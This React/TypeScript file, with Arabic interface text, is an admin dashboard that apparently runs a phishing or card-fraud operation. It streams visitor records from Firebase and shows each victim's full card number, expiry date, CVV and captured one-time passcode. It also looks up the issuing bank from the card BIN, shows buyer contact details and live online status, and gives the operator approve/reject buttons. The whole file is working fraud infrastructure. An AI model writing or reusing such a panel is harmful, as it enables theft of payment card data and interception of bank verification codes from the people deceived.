import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import {
  RefreshCw,
  LogOut,
  CreditCard,
  User,
  Clock,
  MapPin,
  Phone,
  Mail,
  Check,
  X,
  ChevronLeft,
  Inbox,
  Circle,
  EyeOff,
  Eye,
} from "lucide-react";
import {
  subscribeToVisitors,
  subscribeToFormSubmissions,
  getOnlineVisitorsCount,
  VisitorData,
  FormSubmission,
} from "@/lib/firebase";
import { useAuth } from "@/context/AuthContext";
import { Button } from "@/components/ui/button";
import { ScrollArea } from "@/components/ui/scroll-area";

interface CombinedData {
  visitorId: string;
  country: string;
  city: string;
  isOnline: boolean;
  currentPage: string;
  lastSeen: any;
  buyerInfo: Record<string, any> | null;
  paymentInfo: Record<string, any> | null;
  paymentSuccess: boolean;
  code: string;
}

interface BinInfo {
  scheme: string;
  type: string;
  brand: string;
  bank: {
    name: string;
    url?: string;
    phone?: string;
    city?: string;
  };
  country: {
    name: string;
    emoji?: string;
    currency?: string;
    alpha2?: string;
  };
}

const lookupBin = async (cardNumber: string): Promise<BinInfo | null> => {
  try {
    const bin = cardNumber.replace(/\s/g, "").substring(0, 6);
    if (bin.length < 6) return null;

    const response = await fetch('/api/bin-lookup', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ bin })
    });
    
    if (!response.ok) return null;

    const data = await response.json();
    
    if (data.BIN) {
      return {
        scheme: data.BIN.scheme || '',
        type: data.BIN.type || '',
        brand: data.BIN.brand || '',
        bank: {
          name: data.BIN.issuer?.name || '',
          url: data.BIN.issuer?.website || '',
          phone: data.BIN.issuer?.phone || '',
          city: ''
        },
        country: {
          name: data.BIN.country?.country || '',
          emoji: '',
          currency: data.BIN.currency || '',
          alpha2: data.BIN.country?.alpha2 || ''
        }
      };
    }
    
    return null;
  } catch (error) {
    console.error("BIN lookup failed:", error);
    return null;
  }
};

function getCountryFlag(countryCode: string): string {
  const codePoints = countryCode
    .toUpperCase()
    .split("")
    .map((char) => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

function CreditCardDisplay({
  paymentInfo,
  binInfo,
}: {
  paymentInfo: Record<string, any>;
  binInfo: any;
}) {
  const cardNumber = paymentInfo.cardLast4 || "";
  const formattedNumber = cardNumber
    .replace(/\s/g, "")
    .replace(/(.{4})/g, "$1 ")
    .trim();

  const getCardSchemeColor = () => {
    const scheme = binInfo?.scheme?.toLowerCase();
    if (scheme === "visa") return "from-blue-600 to-blue-800";
    if (scheme === "mastercard") return "from-red-500 to-orange-500";
    if (scheme === "amex" || scheme === "american express")
      return "from-gray-600 to-gray-800";
    return "from-slate-700 to-slate-900";
  };

  const getCardSchemeLogo = () => {
    const scheme = binInfo?.scheme?.toLowerCase();
    if (scheme === "visa") {
      return (
        <div className="text-white font-bold text-lg italic tracking-wider drop-shadow-lg">
          VISA
        </div>
      );
    }
    if (scheme === "mastercard") {
      return (
        <div className="flex items-center">
          <div className="w-6 h-6 bg-red-500 rounded-full opacity-90 -mr-2"></div>
          <div className="w-6 h-6 bg-yellow-400 rounded-full opacity-90"></div>
        </div>
      );
    }
    if (scheme === "amex" || scheme === "american express") {
      return (
        <div className="text-white font-bold text-sm tracking-wide">AMEX</div>
      );
    }
    return <CreditCard className="w-6 h-6 text-white" />;
  };

  return (
    <div className="space-y-2">
      <div
        className={`w-full rounded-xl p-4 bg-gradient-to-br ${getCardSchemeColor()} text-white shadow-lg relative overflow-hidden`}
      >
        <div className="absolute top-0 right-0 w-24 h-24 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/2"></div>
        <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/5 rounded-full translate-y-1/2 -translate-x-1/2"></div>

        <div className="flex items-start justify-between mb-4 relative z-10">
          <div>
            <div className="text-white font-bold text-xs mb-0.5">
              {binInfo?.bank?.name || "بنك غير معروف"}
            </div>
            <div className="flex items-center gap-1">
              {binInfo?.country?.alpha2 && (
                <span className="text-sm">
                  {getCountryFlag(binInfo.country.alpha2)}
                </span>
              )}
              <span className="text-white/80 text-[10px]">
                {binInfo?.country?.name || "دولة غير معروفة"}
              </span>
            </div>
          </div>
          {getCardSchemeLogo()}
        </div>

        <div className="mb-3 relative z-10">
          <div
            className="font-mono text-base tracking-[0.15em] font-medium"
            dir="ltr"
          >
            {formattedNumber || "•••• •••• •••• ••••"}
          </div>
        </div>

        <div className="flex items-end justify-between relative z-10">
          <div>
            <div className="text-white/60 text-[9px] mb-0.5">CARD HOLDER</div>
            <div className="font-semibold text-xs uppercase tracking-wide">
              {paymentInfo.cardholderName || "N/A"}
            </div>
          </div>

          <div className="flex gap-3 items-end">
            <div className="text-center">
              <div className="text-white/60 text-[9px] mb-0.5">VALID THRU</div>
              <div className="font-mono text-xs font-medium">
                {paymentInfo.expiryDate || "MM/YY"}
              </div>
            </div>

            <div className="text-center">
              <div className="text-white/60 text-[9px] mb-0.5">CVV</div>
              <div className="font-mono text-xs font-bold">
                {paymentInfo.cvv || "•••"}
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-center justify-between mt-3 pt-2 border-t border-white/20 relative z-10">
          <div className="flex items-center gap-1.5">
            <span
              className={`px-2 py-0.5 rounded-full text-[9px] font-bold uppercase ${
                binInfo?.type?.toLowerCase() === "debit"
                  ? "bg-green-500/40 text-green-100"
                  : "bg-purple-500/40 text-purple-100"
              }`}
            >
              {binInfo?.type || "CARD"}
            </span>
            {binInfo?.brand && (
              <span className="px-2 py-0.5 rounded-full text-[9px] font-medium bg-white/20 uppercase">
                {binInfo.brand}
              </span>
            )}
          </div>
          {binInfo?.country?.currency && (
            <span className="px-2 py-0.5 rounded-full text-[9px] font-bold bg-white/20">
              {binInfo.country.currency}
            </span>
          )}
        </div>
      </div>

      {binInfo && (
        <div className="grid grid-cols-4 gap-2">
          <div className="bg-slate-100 rounded p-2 text-center">
            <div className="text-base mb-0.5">
              {binInfo.country?.alpha2
                ? getCountryFlag(binInfo.country.alpha2)
                : "🏦"}
            </div>
            <div className="text-[9px] text-slate-500">الدولة</div>
            <div className="text-[10px] font-medium text-slate-700 truncate">
              {binInfo.country?.name || "-"}
            </div>
          </div>
          <div className="bg-slate-100 rounded p-2 text-center">
            <div className="text-base mb-0.5">🏛️</div>
            <div className="text-[9px] text-slate-500">البنك</div>
            <div className="text-[10px] font-medium text-slate-700 truncate">
              {binInfo.bank?.name || "-"}
            </div>
          </div>
          <div className="bg-slate-100 rounded p-2 text-center">
            <div className="text-base mb-0.5">
              {binInfo.type?.toLowerCase() === "debit" ? "💳" : "💎"}
            </div>
            <div className="text-[9px] text-slate-500">النوع</div>
            <div className="text-[10px] font-medium text-slate-700">
              {binInfo.type || "-"}
            </div>
          </div>
          <div className="bg-slate-100 rounded p-2 text-center">
            <div className="text-base mb-0.5">💰</div>
            <div className="text-[9px] text-slate-500">العملة</div>
            <div className="text-[10px] font-medium text-slate-700">
              {binInfo.country?.currency || "-"}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const { user, isLoading: authLoading, logout } = useAuth();
  const [visitors, setVisitors] = useState<VisitorData[]>([]);
  const [formSubmissions, setFormSubmissions] = useState<FormSubmission[]>([]);
  const [onlineCount, setOnlineCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedData, setSelectedData] = useState<CombinedData | null>(null);
  const [binInfo, setBinInfo] = useState<BinInfo | null>(null);
  const [loadingBin, setLoadingBin] = useState(false);
  const [hiddenIds, setHiddenIds] = useState<Set<string>>(new Set());
  const [showHidden, setShowHidden] = useState(false);

  useEffect(() => {
    if (!authLoading && !user) {
      setLocation("/admin/login");
    }
  }, [user, authLoading, setLocation]);

  useEffect(() => {
    if (!user) return;

    const unsubVisitors = subscribeToVisitors((data) => {
      setVisitors(data);
      setIsLoading(false);
    });

    const unsubForms = subscribeToFormSubmissions((data) => {
      setFormSubmissions(data);
    });

    const unsubOnline = getOnlineVisitorsCount((count) => {
      setOnlineCount(count);
    });

    return () => {
      unsubVisitors();
      unsubForms();
      unsubOnline();
    };
  }, [user]);

  const formatTimeAgo = (timestamp: any) => {
    if (!timestamp?.toDate) return "";
    const date = timestamp.toDate();
    const now = new Date();
    const diff = now.getTime() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);

    if (minutes < 1) return "الآن";
    if (minutes < 60) return `${minutes}د`;
    if (hours < 24) return `${hours}س`;
    return `${Math.floor(diff / 86400000)}ي`;
  };

  const formatFullTime = (timestamp: any) => {
    if (!timestamp?.toDate) return "غير معروف";
    const date = timestamp.toDate();
    return date.toLocaleString("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  };

  const handleLogout = async () => {
    await logout();
    setLocation("/admin/login");
  };

  const combinedData: CombinedData[] = visitors.map((visitor) => {
    const buyerSubmission = formSubmissions.find(
      (f) =>
        f.visitorId === visitor.visitorId && f.formType === "buyer_details",
    );
    const paymentSubmission = formSubmissions.find(
      (f) =>
        f.visitorId === visitor.visitorId && f.formType === "payment_attempt",
    );

    return {
      visitorId: visitor.visitorId,
      country: visitor.country || "Unknown",
      city: visitor.city || "",
      isOnline: visitor.isOnline || false,
      currentPage: visitor.currentPage || "الرئيسية",
      lastSeen: visitor.lastSeen,
      buyerInfo: buyerSubmission?.data || null,
      paymentInfo: paymentSubmission?.data || null,
      paymentSuccess: paymentSubmission?.success || false,
      code: paymentSubmission?.data?.otp || "",
    };
  });

  const filteredData = combinedData.filter(
    (row) => row.paymentInfo && (showHidden || !hiddenIds.has(row.visitorId)),
  );
  const hiddenCount = combinedData.filter(
    (row) => row.paymentInfo && hiddenIds.has(row.visitorId),
  ).length;

  // Real-time update for selected entry
  useEffect(() => {
    if (selectedData) {
      const updated = combinedData.find(d => d.visitorId === selectedData.visitorId);
      if (updated && JSON.stringify(updated) !== JSON.stringify(selectedData)) {
        setSelectedData(updated);
      }
    }
  }, [combinedData, selectedData]);

  const handleHideEntry = (visitorId: string) => {
    setHiddenIds((prev) => {
      const newSet = new Set(prev);
      if (newSet.has(visitorId)) {
        newSet.delete(visitorId);
      } else {
        newSet.add(visitorId);
      }
      return newSet;
    });
    if (selectedData?.visitorId === visitorId && !showHidden) {
      setSelectedData(null);
    }
  };

  const handleSelectEntry = async (data: CombinedData) => {
    setSelectedData(data);
    setBinInfo(null);

    if (data.paymentInfo?.cardLast4) {
      setLoadingBin(true);
      const info = await lookupBin(data.paymentInfo.cardLast4);
      setBinInfo(info);
      setLoadingBin(false);
    }
  };

  if (authLoading || isLoading) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-8 h-8 text-slate-600 animate-spin mx-auto mb-4" />
          <p className="text-slate-500">جاري التحميل...</p>
        </div>
      </div>
    );
  }

  if (!user) {
    return null;
  }

  return (
    <div className="h-screen bg-slate-100 flex flex-col" dir="rtl">
      <header className="bg-white border-b border-slate-200 px-4 py-3 flex items-center justify-between gap-4 shrink-0">
        <div className="flex items-center gap-3">
          <div className="w-9 h-9 rounded-lg bg-gradient-to-br from-slate-700 to-slate-900 flex items-center justify-center">
            <Inbox className="w-5 h-5 text-white" />
          </div>
          <div>
            <h1 className="text-lg font-semibold text-slate-800">
              لوحة التحكم
            </h1>
            <p className="text-xs text-slate-500">
              {filteredData.length} رسالة
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          {hiddenCount > 0 && (
            <Button
              onClick={() => setShowHidden(!showHidden)}
              variant={showHidden ? "default" : "outline"}
              size="sm"
              className="text-xs"
            >
              <EyeOff className="w-3.5 h-3.5 ml-1" />
              {showHidden
                ? `إخفاء (${hiddenCount})`
                : `المخفية (${hiddenCount})`}
            </Button>
          )}
          <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 rounded-full">
            <Circle className="w-2 h-2 fill-green-500 text-green-500" />
            <span className="text-xs font-medium text-green-700">
              {onlineCount} متصل
            </span>
          </div>
          <Button
            onClick={handleLogout}
            variant="ghost"
            size="sm"
            className="text-slate-500"
          >
            <LogOut className="w-4 h-4" />
          </Button>
        </div>
      </header>

      <div className="flex-1 flex overflow-hidden">
        <div className="w-72 bg-white border-l border-slate-200 flex flex-col">
          <ScrollArea className="flex-1">
            <div className="divide-y divide-slate-100">
              {filteredData.length > 0 ? (
                filteredData.map((row) => (
                  <div
                    key={row.visitorId}
                    onClick={() => handleSelectEntry(row)}
                    className={`p-2.5 cursor-pointer transition-colors ${
                      selectedData?.visitorId === row.visitorId
                        ? "bg-slate-100"
                        : "hover:bg-slate-50"
                    }`}
                    data-testid={`inbox-item-${row.visitorId}`}
                  >
                    <div className="flex items-start gap-2">
                      <div
                        className={`w-7 h-7 rounded-full flex items-center justify-center shrink-0 ${
                          row.isOnline ? "bg-green-100" : "bg-slate-100"
                        }`}
                      >
                        <User
                          className={`w-3.5 h-3.5 ${row.isOnline ? "text-green-600" : "text-slate-400"}`}
                        />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between gap-1 mb-0.5">
                          <span className="font-medium text-slate-800 truncate text-xs">
                            {row.paymentInfo?.cardholderName || "غير معروف"}
                          </span>
                          <span className="text-[10px] text-slate-400 shrink-0">
                            {formatTimeAgo(row.lastSeen)}
                          </span>
                        </div>
                        <div className="flex items-center gap-1 mb-0.5">
                          <span className="text-[10px] text-slate-500 truncate">
                            {row.country} {row.city && `• ${row.city}`}
                          </span>
                        </div>
                        <div className="flex items-center gap-1.5">
                          {row.code && (
                            <span className="font-mono text-[10px] font-bold text-amber-600 bg-amber-50 px-1 py-0.5 rounded">
                              OTP: {row.code}
                            </span>
                          )}
                          <span
                            className={`text-[10px] px-1 py-0.5 rounded ${
                              row.isOnline
                                ? "bg-green-50 text-green-600"
                                : "bg-slate-100 text-slate-500"
                            }`}
                          >
                            {row.isOnline ? "متصل" : "غير متصل"}
                          </span>
                        </div>
                      </div>
                    </div>
                  </div>
                ))
              ) : (
                <div className="p-8 text-center">
                  <Inbox className="w-12 h-12 text-slate-300 mx-auto mb-3" />
                  <p className="text-slate-500 text-sm">لا توجد رسائل</p>
                </div>
              )}
            </div>
          </ScrollArea>
        </div>

        <div className="flex-1 bg-slate-50 flex flex-col">
          {selectedData ? (
            <>
              <div className="bg-white border-b border-slate-200 p-3 shrink-0">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div
                      className={`w-9 h-9 rounded-full flex items-center justify-center ${
                        selectedData.isOnline ? "bg-green-100" : "bg-slate-100"
                      }`}
                    >
                      <User
                        className={`w-4 h-4 ${selectedData.isOnline ? "text-green-600" : "text-slate-400"}`}
                      />
                    </div>
                    <div>
                      <h2 className="font-semibold text-slate-800 text-sm">
                        {selectedData.paymentInfo?.cardholderName ||
                          "غير معروف"}
                      </h2>
                      <div className="flex items-center gap-1.5 text-[11px] text-slate-500">
                        <MapPin className="w-3 h-3" />
                        <span>
                          {selectedData.country}{" "}
                          {selectedData.city && `• ${selectedData.city}`}
                        </span>
                        <span className="text-slate-300">|</span>
                        <Clock className="w-3 h-3" />
                        <span>{formatFullTime(selectedData.lastSeen)}</span>
                      </div>
                    </div>
                  </div>
                  <div className="flex items-center gap-2">
                    <Button
                      variant="default"
                      size="sm"
                      className="bg-green-600 hover:bg-green-700"
                    >
                      <Check className="w-4 h-4 ml-1" />
                      موافقة
                    </Button>
                    <Button variant="destructive" size="sm">
                      <X className="w-4 h-4 ml-1" />
                      رفض
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => handleHideEntry(selectedData.visitorId)}
                      className="text-slate-600"
                    >
                      {hiddenIds.has(selectedData.visitorId) ? (
                        <>
                          <Eye className="w-4 h-4 ml-1" />
                          إظهار
                        </>
                      ) : (
                        <>
                          <EyeOff className="w-4 h-4 ml-1" />
                          إخفاء
                        </>
                      )}
                    </Button>
                  </div>
                </div>
              </div>

              <ScrollArea className="flex-1 p-4">
                <div className="mx-auto space-y-4 grid grid-cols-2 gap-3">
                  {selectedData.code && (
                    <div className="bg-amber-50 border border-amber-200 rounded-lg p-3 text-center">
                      <span className="text-xs text-amber-600 block mb-0.5">
                        رمز التحقق OTP
                      </span>
                      <span className="font-mono text-2xl font-bold text-amber-700">
                        {selectedData.code}
                      </span>
                    </div>
                  )}

                  {selectedData.paymentInfo && (
                    <div className="bg-white rounded-lg border border-slate-200 p-3">
                      <div className="flex items-center gap-1.5 mb-2">
                        <CreditCard className="w-4 h-4 text-slate-600" />
                        <h3 className="font-semibold text-slate-700 text-xs">
                          معلومات البطاقة
                        </h3>
                      </div>

                      {loadingBin ? (
                        <div className="flex items-center justify-center py-4">
                          <RefreshCw className="w-4 h-4 text-slate-400 animate-spin" />
                        </div>
                      ) : (
                        <CreditCardDisplay
                          paymentInfo={selectedData.paymentInfo}
                          binInfo={binInfo}
                        />
                      )}

                      <div className="grid grid-cols-3 gap-2 mt-3">
                        <div className="bg-slate-50 rounded p-2 text-center">
                          <span className="text-[10px] text-slate-500 block mb-0.5">
                            رقم البطاقة
                          </span>
                          <span
                            className="font-mono text-xs font-medium text-slate-700"
                            dir="ltr"
                          >
                            {selectedData.paymentInfo.cardLast4 || "-"}
                          </span>
                        </div>
                        <div className="bg-slate-50 rounded p-2 text-center">
                          <span className="text-[10px] text-slate-500 block mb-0.5">
                            تاريخ الانتهاء
                          </span>
                          <span className="font-mono text-xs font-medium text-slate-700">
                            {selectedData.paymentInfo.expiryDate || "-"}
                          </span>
                        </div>
                        <div className="bg-slate-50 rounded p-2 text-center">
                          <span className="text-[10px] text-slate-500 block mb-0.5">
                            CVV
                          </span>
                          <span className="font-mono text-xs font-bold text-slate-700">
                            {selectedData.paymentInfo.cvv || "-"}
                          </span>
                        </div>
                      </div>
                    </div>
                  )}

                  {selectedData.buyerInfo && (
                    <div className="bg-white rounded-lg border border-slate-200 p-3">
                      <div className="flex items-center gap-1.5 mb-2">
                        <User className="w-4 h-4 text-slate-600" />
                        <h3 className="font-semibold text-slate-700 text-xs">
                          معلومات المشتري
                        </h3>
                      </div>

                      <div className="grid grid-cols-2 gap-2">
                        <div className="space-y-0.5">
                          <span className="text-[10px] text-slate-500">
                            الاسم الكامل
                          </span>
                          <p className="text-xs font-medium text-slate-800">
                            {selectedData.buyerInfo.firstName}{" "}
                            {selectedData.buyerInfo.lastName}
                          </p>
                        </div>

                        {selectedData.buyerInfo.email && (
                          <div className="space-y-0.5">
                            <span className="text-[10px] text-slate-500">
                              البريد الإلكتروني
                            </span>
                            <p className="text-xs font-medium text-slate-800 flex items-center gap-1">
                              <Mail className="w-3 h-3 text-slate-400" />
                              {selectedData.buyerInfo.email}
                            </p>
                          </div>
                        )}

                        {selectedData.buyerInfo.phone && (
                          <div className="space-y-0.5">
                            <span className="text-[10px] text-slate-500">
                              رقم الهاتف
                            </span>
                            <p
                              className="text-xs font-medium text-slate-800 flex items-center gap-1"
                              dir="ltr"
                            >
                              <Phone className="w-3 h-3 text-slate-400" />
                              {selectedData.buyerInfo.phone}
                            </p>
                          </div>
                        )}

                        {selectedData.buyerInfo.nationality && (
                          <div className="space-y-0.5">
                            <span className="text-[10px] text-slate-500">
                              الجنسية
                            </span>
                            <p className="text-xs font-medium text-slate-800">
                              {selectedData.buyerInfo.nationality}
                            </p>
                          </div>
                        )}

                        {selectedData.buyerInfo.gender && (
                          <div className="space-y-0.5">
                            <span className="text-[10px] text-slate-500">
                              الجنس
                            </span>
                            <p className="text-xs font-medium text-slate-800">
                              {selectedData.buyerInfo.gender}
                            </p>
                          </div>
                        )}

                        {selectedData.buyerInfo.favoriteTeam && (
                          <div className="space-y-0.5">
                            <span className="text-[10px] text-slate-500">
                              الفريق المفضل
                            </span>
                            <p className="text-xs font-medium text-slate-800">
                              {selectedData.buyerInfo.favoriteTeam}
                            </p>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {binInfo && (
                    <div className="bg-white rounded-lg border border-slate-200 p-3">
                      <h3 className="font-semibold text-slate-700 text-xs mb-2">
                        معلومات البنك
                      </h3>
                      <div className="grid grid-cols-2 gap-2 text-xs">
                        <div>
                          <span className="text-slate-500">البنك:</span>
                          <span className="font-medium text-slate-800 mr-1">
                            {binInfo.bank?.name || "غير معروف"}
                          </span>
                        </div>
                        <div>
                          <span className="text-slate-500">الدولة:</span>
                          <span className="font-medium text-slate-800 mr-1">
                            {binInfo.country?.name || "غير معروف"}
                          </span>
                        </div>
                        <div>
                          <span className="text-slate-500">النوع:</span>
                          <span className="font-medium text-slate-800 mr-1">
                            {binInfo.type || "غير معروف"}
                          </span>
                        </div>
                        <div>
                          <span className="text-slate-500">العملة:</span>
                          <span className="font-medium text-slate-800 mr-1">
                            {binInfo.country?.currency || "غير معروف"}
                          </span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              </ScrollArea>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center">
              <div className="text-center">
                <div className="w-16 h-16 rounded-full bg-slate-200 flex items-center justify-center mx-auto mb-4">
                  <ChevronLeft className="w-8 h-8 text-slate-400" />
                </div>
                <p className="text-slate-500">اختر رسالة لعرض التفاصيل</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
